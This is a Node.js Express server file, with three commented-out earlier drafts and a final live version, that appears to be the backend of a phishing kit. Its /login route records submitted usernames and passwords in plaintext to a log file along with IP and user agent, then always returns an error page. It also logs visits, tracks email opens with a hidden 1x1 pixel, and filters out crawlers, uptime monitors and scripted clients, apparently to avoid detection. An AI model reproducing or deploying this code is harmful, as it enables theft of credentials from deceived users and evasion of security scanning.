// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// app.get('/', (req, res) => {
//   console.log(`Page visited by: ${req.ip} at ${new Date().toISOString()}`);
//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   console.log(`Username: ${username}, Password: ${password}`);
//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });


// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');
// const fs = require('fs');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// // Helper to check if request is likely from a bot
// function isBot(userAgent) {
//   if (!userAgent) return true;
//   const botKeywords = ['UptimeRobot', 'Pingdom', 'curl', 'bot', 'spider'];
//   return botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword.toLowerCase()));
// }

// app.get('/', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.ip;
//   const timestamp = new Date().toISOString();

//   if (!isBot(userAgent)) {
//     const log = `VISIT -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//     console.log(log);
//     fs.appendFile('visits.log', log, err => {
//       if (err) console.error('Log error:', err);
//     });
//   } else {
//     console.log(`Bot ping detected from: ${ip} [${userAgent}]`);
//   }

//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   const ip = req.ip;
//   const timestamp = new Date().toISOString();
//   const userAgent = req.headers['user-agent'] || '';

//   if (!isBot(userAgent)) {
//     const log = `LOGIN -> ${timestamp} | IP: ${ip} | Username: ${username} | Password: ${password}\n`;
//     console.log(log);
//     fs.appendFile('logins.log', log, err => {
//       if (err) console.error('Login log error:', err);
//     });
//   } else {
//     console.log(`Bot POST detected. UA: ${userAgent}`);
//   }

//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });



// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');
// const fs = require('fs');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// // Helper to check if request is likely from a bot
// function isBot(userAgent) {
//   if (!userAgent) return true;
//   const botKeywords = ['UptimeRobot', 'Pingdom', 'curl', 'bot', 'spider'];
//   return botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword.toLowerCase()));
// }

// app.get('/', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();

//   if (!isBot(userAgent)) {
//     const log = `VISIT -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//     console.log(log);
//     fs.appendFile('visits.log', log, err => {
//       if (err) console.error('Log error:', err);
//     });
//   } else {
//     console.log(`Bot ping detected from: ${ip} [${userAgent}]`);
//   }

//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();
//   const userAgent = req.headers['user-agent'] || '';

//   if (!isBot(userAgent)) {
//     const log = `LOGIN -> ${timestamp} | IP: ${ip} | Username: ${username} | Password: ${password}\n`;
//     console.log(log);
//     fs.appendFile('logins.log', log, err => {
//       if (err) console.error('Login log error:', err);
//     });
//   } else {
//     console.log(`Bot POST detected. UA: ${userAgent}`);
//   }

//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// // Email open tracking pixel
// app.get('/tracker.gif', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();

//   if (!isBot(userAgent)) {
//     const log = `TRACK -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//     console.log(log);
//     fs.appendFile('opens.log', log, err => {
//       if (err) console.error('Tracker log error:', err);
//     });
//   }

//   // 1x1 transparent GIF
//   const gif = Buffer.from(
//     'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==',
//     'base64'
//   );
//   res.set('Content-Type', 'image/gif');
//   res.set('Content-Length', gif.length);
//   res.send(gif);
// });

// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });


const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Enhanced bot detection
function isBot(userAgent) {
  if (!userAgent) return true;
  const botKeywords = [
    'uptime', 'pingdom', 'curl', 'bot', 'spider', 'crawler',
    'go-http-client', 'axios', 'fetch', 'monitor'
  ];
  return botKeywords.some(keyword =>
    userAgent.toLowerCase().includes(keyword)
  );
}

// Homepage route
app.get('/', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.ip;
  const timestamp = new Date().toISOString();

  if (isBot(userAgent)) {
    // Ignore bots completely — no log, no file serving
    return res.status(204).end();
  }

  const log = `VISIT -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
  console.log(log);
  fs.appendFile('visits.log', log, err => {
    if (err) console.error('Log error:', err);
  });

  res.sendFile(path.join(__dirname, 'index.html'));
});

// Login route
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip;
  const timestamp = new Date().toISOString();
  const userAgent = req.headers['user-agent'] || '';

  if (isBot(userAgent)) {
    // Ignore bot POST requests
    return res.status(204).end();
  }

  const log = `LOGIN -> ${timestamp} | IP: ${ip} | Username: ${username} | Password: ${password}\n`;
  console.log(log);
  fs.appendFile('logins.log', log, err => {
    if (err) console.error('Login log error:', err);
  });

  res.sendFile(path.join(__dirname, 'error.html'));
});

// Email open tracking route
app.get('/tracker.gif', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.ip;
  const timestamp = new Date().toISOString();

  if (isBot(userAgent)) {
    // Ignore tracker hits by bots
    return res.status(204).end();
  }

  const log = `TRACK -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
  console.log(log);
  fs.appendFile('opens.log', log, err => {
    if (err) console.error('Tracker log error:', err);
  });

  // Send 1x1 transparent GIF
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==', 'base64');
  res.set('Content-Type', 'image/gif');
  res.set('Content-Length', gif.length);
  res.send(gif);
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});


